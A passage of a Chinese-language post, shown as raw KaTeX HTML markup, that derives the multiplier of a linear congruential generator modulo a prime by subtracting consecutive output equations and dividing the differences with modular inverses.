xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo separator="true">,</mo><mi>p</mi></mrow><annotation encoding="application/x-tex">a,b,p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">b</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">p</span></span></span></span>的值（此处保证了<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mo separator="true">,</mo><mi>p</mi></mrow><annotation encoding="application/x-tex">a,p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">p</span></span></span></span>是素数）。当然为了保险，15组数据也是足够的。</p><p>首先，我们假设我们获取的数字为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>x</mi><mn>2</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><msub><mi>x</mi><mn>8</mn></msub></mrow><annotation encoding="application/x-tex">x_1,x_2,...,x_8</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">8</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>。那么我们可以有：</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mi>i</mi></msub><mo>≡</mo><mi>a</mi><msub><mi>x</mi><mrow><mi>i</mi><mo>−</mo><mn>1</mn></mrow></msub><mo>+</mo><mi>b</mi><mspace></mspace><mspace width="1em"/><mo stretchy="false">(</mo><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mspace width="0.3333333333333333em"/><mi>p</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">x_i\equiv ax_{i-1}+b \pmod p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.61375em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.791661em;vertical-align:-0.208331em;"></span><span class="mord mathdefault">a</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">b</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.3333333333333333em;"></span><span class="mord mathdefault">p</span><span class="mclose">)</span></span></span></span></span></p><p>那么化简一下，就是：</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mtable width="100%"><mtr><mtd width="50%"></mtd><mtd><mrow><msub><mi>x</mi><mn>2</mn></msub><mo>≡</mo><mi>a</mi><msub><mi>x</mi><mn>1</mn></msub><mo>+</mo><mi>b</mi><mspace></mspace><mspace width="1em"/><mo stretchy="false">(</mo><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mspace width="0.3333333333333333em"/><mi>p</mi><mo stretchy="false">)</mo></mrow></mtd><mtd width="50%"></mtd><mtd><mtext>(1)</mtext></mtd></mtr></mtable><annotation encoding="application/x-tex">x_2\equiv ax_1+b\pmod p \tag1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.61375em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord mathdefault">a</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">b</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.3333333333333333em;"></span><span class="mord mathdefault">p</span><span class="mclose">)</span></span><span class="tag"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord text"><span class="mord">(</span><span class="mord"><span class="mord">1</span></span><span class="mord">)</span></span></span></span></span></span></p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mtable width="100%"><mtr><mtd width="50%"></mtd><mtd><mrow><msub><mi>x</mi><mn>3</mn></msub><mo>≡</mo><mi>a</mi><msub><mi>x</mi><mn>2</mn></msub><mo>+</mo><mi>b</mi><mspace></mspace><mspace width="1em"/><mo stretchy="false">(</mo><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mspace width="0.3333333333333333em"/><mi>p</mi><mo stretchy="false">)</mo></mrow></mtd><mtd width="50%"></mtd><mtd><mtext>(2)</mtext></mtd></mtr></mtable><annotation encoding="application/x-tex">x_3\equiv  ax_2+b\pmod p\tag 2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.61375em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord mathdefault">a</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">b</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.3333333333333333em;"></span><span class="mord mathdefault">p</span><span class="mclose">)</span></span><span class="tag"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord text"><span class="mord">(</span><span class="mord"><span class="mord">2</span></span><span class="mord">)</span></span></span></span></span></span></p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mtable width="100%"><mtr><mtd width="50%"></mtd><mtd><mrow><msub><mi>x</mi><mn>4</mn></msub><mo>≡</mo><mi>a</mi><msub><mi>x</mi><mn>3</mn></msub><mo>+</mo><mi>b</mi><mspace></mspace><mspace width="1em"/><mo stretchy="false">(</mo><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mspace width="0.3333333333333333em"/><mi>p</mi><mo stretchy="false">)</mo></mrow></mtd><mtd width="50%"></mtd><mtd><mtext>(3)</mtext></mtd></mtr></mtable><annotation encoding="application/x-tex">x_4\equiv  ax_3+b \pmod p \tag 3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.61375em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord mathdefault">a</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">b</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.3333333333333333em;"></span><span class="mord mathdefault">p</span><span class="mclose">)</span></span><span class="tag"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord text"><span class="mord">(</span><span class="mord"><span class="mord">3</span></span><span class="mord">)</span></span></span></span></span></span></p><p>然后，由<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mn>2</mn><mo stretchy="false">)</mo><mo>−</mo><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo><mo separator="true">,</mo><mo stretchy="false">(</mo><mn>3</mn><mo stretchy="false">)</mo><mo>−</mo><mo stretchy="false">(</mo><mn>2</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(2)-(1),(3)-(2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">2</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mopen">(</span><span class="mord">3</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">2</span><span class="mclose">)</span></span></span></span>，消去<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi></mrow><annotation encoding="application/x-tex">b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">b</span></span></span></span>，可以得到：</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mtable width="100%"><mtr><mtd width="50%"></mtd><mtd><mrow><msub><mi>x</mi><mn>3</mn></msub><mo>−</mo><msub><mi>x</mi><mn>2</mn></msub><mo>≡</mo><mi>a</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mn>2</mn></msub><mo>−</mo><msub><mi>x</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mspace></mspace><mspace width="1em"/><mo stretchy="false">(</mo><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mspace width="0.3333333333333333em"/><mi>p</mi><mo stretchy="false">)</mo></mrow></mtd><mtd width="50%"></mtd><mtd><mtext>(S1)</mtext></mtd></mtr></mtable><annotation encoding="application/x-tex">x_3-x_2\equiv a(x_2-x_1)\pmod p \tag{S1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.61375em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">a</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.3333333333333333em;"></span><span class="mord mathdefault">p</span><span class="mclose">)</span></span><span class="tag"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord text"><span class="mord">(</span><span class="mord"><span class="mord">S</span><span class="mord">1</span></span><span class="mord">)</span></span></span></span></span></span></p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mtable width="100%"><mtr><mtd width="50%"></mtd><mtd><mrow><msub><mi>x</mi><mn>4</mn></msub><mo>−</mo><msub><mi>x</mi><mn>3</mn></msub><mo>≡</mo><mi>a</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mn>3</mn></msub><mo>−</mo><msub><mi>x</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mspace></mspace><mspace width="1em"/><mo stretchy="false">(</mo><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mspace width="0.3333333333333333em"/><mi>p</mi><mo stretchy="false">)</mo></mrow></mtd><mtd width="50%"></mtd><mtd><mtext>(S2)</mtext></mtd></mtr></mtable><annotation encoding="application/x-tex">x_4-x_3\equiv a(x_3-x_2)\pmod p \tag{S2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.61375em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">a</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.3333333333333333em;"></span><span class="mord mathdefault">p</span><span class="mclose">)</span></span><span class="tag"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord text"><span class="mord">(</span><span class="mord"><span class="mord">S</span><span class="mord">2</span></span><span class="mord">)</span></span></span></span></span></span></p><p>由于在<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mspace></mspace><mspace width="0.6666666666666666em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">\mod p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0em;vertical-align:0em;"></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6666666666666666em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">p</span></span></span></span>的条件下，除号表示乘上某个数的逆元，因此，我们把<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">a</span></span></span></span>提出来，就是</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mtable width="100%"><mtr><mtd width="50%"></mtd><mtd><mrow><mi>a</mi><mo>≡</mo><mfrac><mrow><msub><mi>x</mi><mn>3</mn></msub><mo>−</mo><msub><mi>x</mi><mn>2</mn></msub></mrow><mrow><msub><mi>x</mi><mn>2</mn></msub><mo>−</mo><msub><mi>x</mi><mn>1</mn></msub></mrow></mfrac><mo>≡</mo><mfrac><mrow><msub><mi>x</mi><mn>4</mn></msub><mo>−</mo><msub><mi>x</mi><mn>3</mn></msub></mrow><mrow><msub><mi>x</mi><mn>3</mn></msub><mo>−</mo><msub><mi>x</mi><mn>2</mn></msub></mrow></mfrac><mspace></mspace><mspace width="1em"/><mo stretchy="false">(</mo><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mspace width="0.3333333333333333em"/><mi>p</mi><mo stretchy="false">)</mo></mrow></mtd><mtd width="50%"></mtd><mtd><mtext>(T)</mtext></mtd></mtr></mtable><annotation encoding="application/x-tex">a\equiv \dfrac{x_3-x_2}{x_2-x_1}\equiv \dfrac{x_4-x_3}{x_3-x_2} \pmod p \tag{T}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.46375em;vertical-align:0em;"></span><span class="mord mathdefault">a</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.09633em;vertical-align:-0.8360000000000001em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.2603300000000002em;"><span style="top:-2.3139999999999996em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord 